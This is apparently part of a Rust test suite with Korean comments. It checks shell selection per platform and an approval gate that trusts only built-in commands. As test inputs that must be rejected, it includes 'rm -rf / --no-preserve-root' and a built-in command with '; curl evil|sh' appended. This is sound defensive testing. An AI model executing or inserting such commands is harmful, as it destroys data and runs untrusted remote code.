    #[test]
    fn command_shell_matches_platform() {
        // 회귀 가드: fire_command가 sh -c 하드코딩이면 Windows에서 항상 NotFound로
        // 실패한다. default_shell/create_surface와 동일하게 플랫폼별로 분기해야 한다.
        let (shell, flag) = command_shell();
        #[cfg(windows)]
        {
            assert_eq!(shell, "cmd");
            assert_eq!(flag, "/C");
        }
        #[cfg(not(windows))]
        {
            assert_eq!(shell, "sh");
            assert_eq!(flag, "-c");
        }
    }

    #[test]
    fn command_shell_actually_spawns_on_this_platform() {
        // 선택된 셸이 실제로 현재 플랫폼에서 spawn되는지 확인 — 잘못된 셸명이면
        // ErrorKind::NotFound로 실패한다. (Windows CI에서 cmd, 그 외에서 sh 검증)
        let (shell, flag) = command_shell();
        let out = std::process::Command::new(shell)
            .arg(flag)
            .arg("echo cys")
            .output()
            .expect("command_shell() must select a shell present on this platform");
        assert!(out.status.success());
        assert!(String::from_utf8_lossy(&out.stdout).contains("cys"));
    }

    // R-CLI-4: 코드 소유 built-in text_command만 무승인 신뢰, 임의·변조 명령은 승인 게이트 대상.
    #[test]
    fn builtin_text_commands_are_trusted_others_gated() {
        for j in builtin_jobs() {
            if let Some(cmd) = j.get("text_command").and_then(|v| v.as_str()) {
                assert!(
                    is_trusted_builtin_text_command(cmd),
                    "built-in text_command이 신뢰되지 않음: {cmd}"
                );
            }
        }
        // 임의 명령은 built-in 아님 → 승인 게이트 대상.
        assert!(
            !is_trusted_builtin_text_command("rm -rf / --no-preserve-root"),
            "임의 명령이 built-in으로 신뢰됨"
        );
        // built-in을 변조(뒤에 명령 추가)하면 더는 신뢰 안 함.
        let base = builtin_jobs()[0]["text_command"].as_str().unwrap().to_string();
        assert!(
            !is_trusted_builtin_text_command(&format!("{base} ; curl evil|sh")),
            "변조된 built-in이 신뢰됨"
        );
    }
}
